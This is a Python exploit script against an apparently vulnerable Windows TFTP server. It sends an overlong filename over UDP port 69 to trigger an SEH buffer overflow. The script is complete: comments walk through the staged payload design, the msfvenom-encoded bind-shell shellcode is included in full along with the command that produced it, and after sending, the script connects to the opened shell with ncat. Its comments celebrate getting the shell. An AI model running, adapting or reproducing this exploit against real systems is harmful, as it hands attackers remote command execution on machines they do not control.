#!/usr/bin/python
# Our PPR: 
# 00409605  |. 5B             POP EBX
#
# Our first stage payload
# where our jump, EB D0 puts us:
# 00BCFFAE   41               INC ECX                                  
#
# Our second stage payload
# Jumping 512 bytes using this:
# D9 EE D9 74 24 F4 59 80 C1 0A 90 FE CD FE CD FF E1
#
# Our third stage payload
# Shellcode which results to 348 bytes:
# msfvenom -p windows/shell_bind_tcp LPORT=12345 EXITFUNC=seh -a x86 --platform windows -b "\x00\x2f" -e x86/shikata_ga_nai -f python -v shellcode
#
# When ran, it'll connect to the port automatically ;)
# Bask in the Glory of Shell, w00t!

from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack
from subprocess import call
from time import sleep 
from sys import argv

host = argv[1] 

shellcode =  ""
shellcode += "\xda\xcb\xba\xd8\xb6\x91\x04\xd9\x74\x24\xf4\x5b"
shellcode += "\x29\xc9\xb1\x53\x31\x53\x17\x83\xc3\x04\x03\x8b"
shellcode += "\xa5\x73\xf1\xd7\x22\xf1\xfa\x27\xb3\x96\x73\xc2"
shellcode += "\x82\x96\xe0\x87\xb5\x26\x62\xc5\x39\xcc\x26\xfd"
shellcode += "\xca\xa0\xee\xf2\x7b\x0e\xc9\x3d\x7b\x23\x29\x5c"
shellcode += "\xff\x3e\x7e\xbe\x3e\xf1\x73\xbf\x07\xec\x7e\xed"
shellcode += "\xd0\x7a\x2c\x01\x54\x36\xed\xaa\x26\xd6\x75\x4f"
shellcode += "\xfe\xd9\x54\xde\x74\x80\x76\xe1\x59\xb8\x3e\xf9"
shellcode += "\xbe\x85\x89\x72\x74\x71\x08\x52\x44\x7a\xa7\x9b"
shellcode += "\x68\x89\xb9\xdc\x4f\x72\xcc\x14\xac\x0f\xd7\xe3"
shellcode += "\xce\xcb\x52\xf7\x69\x9f\xc5\xd3\x88\x4c\x93\x90"
shellcode += "\x87\x39\xd7\xfe\x8b\xbc\x34\x75\xb7\x35\xbb\x59"
shellcode += "\x31\x0d\x98\x7d\x19\xd5\x81\x24\xc7\xb8\xbe\x36"
shellcode += "\xa8\x65\x1b\x3d\x45\x71\x16\x1c\x02\xb6\x1b\x9e"
shellcode += "\xd2\xd0\x2c\xed\xe0\x7f\x87\x79\x49\xf7\x01\x7e"
shellcode += "\xae\x22\xf5\x10\x51\xcd\x06\x39\x96\x99\x56\x51"
shellcode += "\x3f\xa2\x3c\xa1\xc0\x77\xa8\xa9\x67\x28\xcf\x54"
shellcode += "\xd7\x98\x4f\xf6\xb0\xf2\x5f\x29\xa0\xfc\xb5\x42"
shellcode += "\x49\x01\x36\x5c\xb3\x8c\xd0\xf6\xd3\xd8\x4b\x6e"
shellcode += "\x16\x3f\x44\x09\x69\x15\xfc\xbd\x22\x7f\x3b\xc2"
shellcode += "\xb2\x55\x6b\x54\x39\xba\xaf\x45\x3e\x97\x87\x12"
shellcode += "\xa9\x6d\x46\x51\x4b\x71\x43\x01\xe8\xe0\x08\xd1"
shellcode += "\x67\x19\x87\x86\x20\xef\xde\x42\xdd\x56\x49\x70"
shellcode += "\x1c\x0e\xb2\x30\xfb\xf3\x3d\xb9\x8e\x48\x1a\xa9"
shellcode += "\x56\x50\x26\x9d\x06\x07\xf0\x4b\xe1\xf1\xb2\x25"
shellcode += "\xbb\xae\x1c\xa1\x3a\x9d\x9e\xb7\x42\xc8\x68\x57"
shellcode += "\xf2\xa5\x2c\x68\x3b\x22\xb9\x11\x21\xd2\x46\xc8"
shellcode += "\xe1\xec\xb7\xc0\xff\x79\x6e\xb1\xbd\xe7\x91\x6c"
shellcode += "\x81\x11\x12\x84\x7a\xe6\x0a\xed\x7f\xa2\x8c\x1e"
shellcode += "\xf2\xbb\x78\x20\xa1\xbc\xa8"

filename = "A" * (1232-100-20-4-len(shellcode))
filename += "\x90" * 20
filename += shellcode
filename += "B" * (100-17)
filename += "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1"
filename += "\xeb\xd0\x90\x90"
filename += pack('<L', 0x00409605)
filename += "C" * (5000-1232-4)

mode = 'netascii' 

exploit = '\x00\x02'
exploit += filename
exploit += '\0'
exploit += mode
exploit += '\0'

print "[+] Attempting to exploit " + host + "..."
try: 
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect((host, 69))
	print "[+] Sending payload..."
	s.send(exploit)
	s.close()
	print "[+] Attempting to connect to target...\n"
	try:
		sleep(1)
		call(["ncat", host, "12345"])
	except: 
		print "[!] Couldn't connect. Maybe exploit failed?"
except:
	print "[!] Couldn't connect. Maybe exploit failed?"
finally:
	print "\n[+] I <3 SHELLS"
